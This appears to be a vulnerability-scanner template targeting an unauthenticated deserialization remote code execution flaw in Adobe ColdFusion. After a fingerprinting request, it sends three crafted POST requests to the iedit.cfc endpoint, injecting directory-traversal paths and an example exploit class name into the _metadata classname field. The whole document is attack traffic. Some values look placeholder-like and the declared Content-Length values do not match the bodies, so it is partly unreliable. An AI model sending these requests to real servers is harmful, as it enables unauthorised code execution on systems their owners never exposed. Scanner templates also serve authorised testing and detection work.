id: cold_fusion_rce_exploit

info:
  name: Adobe ColdFusion Unauthenticated Remote Code Execution
  author: hexa
  severity: critical
  description: Attempts to exploit a remote unauthenticated deserialization vulnerability in Adobe ColdFusion to achieve remote code execution.
  tags: cve, cve2023, rce

requests:
  - raw:
      - |
        GET / HTTP/1.1
        Host: {{Hostname}}
        Connection: close

    matchers-condition: or
    matchers:
      - type: word
        part: body
        words:
          - "<title>Directory Listing For [/]</title>"
        condition: or
      - type: regex
        part: header
        regex:
          - "(CFCLIENT_[^=]+|CFGLOBALS|CFID|CFTOKEN)=|.cfusion"

  - raw:
      - |
        POST /cf_scripts/scripts/ajax/ckeditor/plugins/filemanager/iedit.cfc?method={{random_str}}&_cfclient=true HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        Content-Length: 300

        _variables={"_metadata":{"classname":"../../../../../../../../../../logs/coldfusion-out.log"},"_variables":[]}

    matchers:
      - type: word
        words:
          - '<title>Error Occurred While Processing Request</title>'
          - '<title>Error</title>'
        condition: or

  - raw:
      - |
        POST /cf_scripts/scripts/ajax/ckeditor/plugins/filemanager/iedit.cfc?method={{random_str}}&_cfclient=true HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        Content-Length: 300

        _variables={"_metadata":{"classname":"com.example.ExploitClass"},"_variables":[]}

    matchers:
      - type: word
        words:
          - '<title>Error Occurred While Processing Request</title>'
          - '<title>Error</title>'
        condition: or

  - raw:
      - |
        POST /cf_scripts/scripts/ajax/ckeditor/plugins/filemanager/iedit.cfc?method={{random_str}}&_cfclient=true HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        Content-Length: 100

        _variables={"_metadata":{"classname":"../../../../../../../../../../tmp/payload.class"},"_variables":[]}

    matchers:
      - type: word
        words:
          - '<title>Error Occurred While Processing Request</title>'
          - '<title>Error</title>'
        condition: or
